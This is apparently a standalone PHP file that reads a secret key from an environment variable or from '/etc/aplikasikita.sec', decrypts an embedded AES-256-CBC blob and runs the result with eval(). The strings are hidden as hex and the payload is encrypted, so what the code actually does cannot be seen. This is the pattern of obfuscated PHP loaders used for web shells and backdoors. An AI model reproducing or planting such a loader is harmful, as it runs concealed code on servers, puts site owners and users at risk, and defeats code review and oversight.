<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('JRCElOCCdajo0GHwo8p0Zw==');

$c=base64_decode(

'Ki8VN2/7FpLLBviNVUOr9QP4tm44XFbBELsSgk9PT/QZuZLNHkT39AXxoGnMKwrH9VJUl110aFFk' .
'JDF90WWZP7pBRQGtxPoa5LdcsHMSbUz6+AdRekCgK4FLSvQQ5PnsIG7be+i2V0XZY032cfh9Kv1/' .
'Tyf7Nb0gHsfnfCUYXPb+cLIRcZ+BmPJaJ9ozWgmZH7iSPJl19CpdQsoraP8rW3sTnUz/TGoDESIi' .
'BkWdrw+BPQiIN6RCgEwCR3DuKpn7JlNsqg86QuG9OvzyauxILNV7ktikz1OGxj+GJvD0C0HWqbWl' .
'D3+KHFlsp8khYrPSbr1OJixyRqnE94Q5pFSzFgZy/kxVAVgzEiP4YWo2L1YxqabzGtEBSKrkLOvz' .
'7vS4oaNWnn2+ya/qAyuIrvKID1v8bNR5feGDOWowgbJhM2jU1lFf9TEXQlCm0wT4+6xRB1R96P/F' .
'nAEgQLCXpkcepO4sEZf0ePx2/r72kq7fuaCceuYVp7sA0J+qZC+93A2buGYge6ofVFH5MSWSq0Fy' .
'xAECjI+nMJJvedChrAJlGzpBIIlwza7RUyAiWywFy0Q+UvNYiZ0Yr9fPflbJtDfSJH2uLcSO9r16' .
'oObQSKfKSX5uCIDDMckO+cATKOgChb65yQrpZ/Jm06r4YOBIAHWE0618vdBekTa2AVh1BZ24Evft' .
'Bon64qklO85HlmQHN/3f+VNGTTo5lSTWSAcFwQtMjw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

